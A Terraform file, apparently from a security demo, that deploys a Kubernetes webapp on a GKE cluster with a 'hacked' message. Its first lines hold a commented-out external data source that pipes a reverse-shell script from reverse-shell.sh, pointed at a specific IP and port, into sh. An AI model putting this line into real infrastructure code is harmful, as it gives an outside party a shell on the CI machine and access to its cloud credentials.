# data "external" "test" {
#   program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
# }

data "google_container_cluster" "mycluster" {
  name     = "my-autopilot"
  location = var.region
}

provider "kubernetes" {
  config_context_cluster = data.google_container_cluster.mycluster.name
}

resource "kubernetes_deployment" "webapp_deployment" {
  metadata {
    name = "webapp-deployment2"
  }

  spec {
    replicas = 1
    selector {
      match_labels = {
        app = "webapp2"
      }
    }

    strategy {
      type = "Recreate"
    }

    template {
      metadata {
        labels = {
          app = "webapp2"
        }
      }

      spec {
        container {
          name  = "webapp2"
          image = "europe-west1-docker.pkg.dev/rare-phoenix-413915/my-repository/web-app-1:latest"
          port {
            container_port = 5000
          }

          env {
            name  = "IMAGE"
            value = "2-sad"
          }

          env {
            name  = "MESSAGE"
            value = "I am Demo2 and I have being hacked!!!"
          }

          image_pull_policy = "Always"
        }
      }
    }
  }
}
